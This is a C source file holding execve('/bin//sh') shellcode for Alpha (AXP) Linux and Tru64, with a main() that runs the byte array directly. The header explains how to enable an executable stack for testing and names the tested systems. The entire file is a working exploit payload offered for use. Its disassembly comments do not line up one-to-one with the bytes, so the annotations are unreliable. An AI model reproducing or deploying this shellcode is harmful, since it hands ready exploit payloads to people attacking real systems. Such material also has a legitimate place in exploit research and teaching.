/* Alpha (AXP) Linux/Tru64 execve() shellcode
*  ==========================================
* This shellcode uses the stack to store a generated
* "callsys" instruction, due to this it needs executable
* stack. To test on Linux use "execstack -s <bin>" and
* on Tru64 use "sysconfig -r proc executable_stack=1".
*
* Tested against Tru64 5.1B & Linux 2.6.26-2-alpha-generic
*
* -- Hacker Fantastic (https://hacker.house)
*/
#include <stdio.h>
#include <stdlib.h>

unsigned char shellcode[] = {
	"\x80\xff\xde\x23"   /* lda $sp,-128($sp)   */
	"\x73\x68\x3f\x24"   /* ldil $1, 0x68732f2f */
	"\x2f\x2f\x21\x20"   /* sll $1, 0x20        */
	"\x21\x17\x24\x48"   /* ldil $2, 0x6e69622f */
	"\x69\x6e\x5f\x24"   /* addq $1, $2, $1     */
	"\x2f\x62\x42\x20"   /* stq $31, -32($sp)   */
	"\x01\x04\x22\x40"   /* stq $31, -24($sp)   */
	"\xe0\xff\xfe\xb7"   /* stq $31, -8($sp)    */
	"\xe8\xff\xfe\xb7"   /* stq $1, -16($sp)    */
	"\xf8\xff\xfe\xb7"   /* mov $sp, $16        */
	"\xf0\xff\x3e\xb4"   /* subq $16, 0x10, $16 */
	"\x10\x04\xfe\x47"   /* stq $16, -40($sp)   */
	"\x30\x15\x02\x42"   /* mov $sp, $17        */
	"\xd8\xff\x1e\xb6"   /* subq $17, 0x28, $17 */
	"\x11\x04\xfe\x47"   /* mov $sp, $18        */
	"\x31\x15\x25\x42"   /* subq $18, 0x18, $18 */
	"\x12\x04\xfe\x47"   /* ldil $0, 0xffffff3c */
	"\x32\x15\x43\x42"   /* ldil $1, 0xffffff01 */
	"\x3c\xff\x1f\x20"   /* subq $0, $1, $0     */
	"\x01\xff\x3f\x20"   /* ldil $1, 0xffffff84 */
	"\x20\x05\x01\x40"   /* ldil $2, 0xffffff01 */
	"\x84\xff\x3f\x20"   /* subq $1, $2, $1     */
	"\x01\xff\x5f\x20"   /* stl $1, -48($sp)    */
	"\x21\x05\x22\x40"   /* subq $sp, 0x30, $sp */
	"\xd0\xff\x3e\xb0"   /* jmp $sp,($sp),0xff10 */
	"\x3e\x15\xc6\x43"
	"\xc4\x3f\xde\x6b"
};

int main(){
	int (*func)();
        func = (int (*)())shellcode;
        func();
}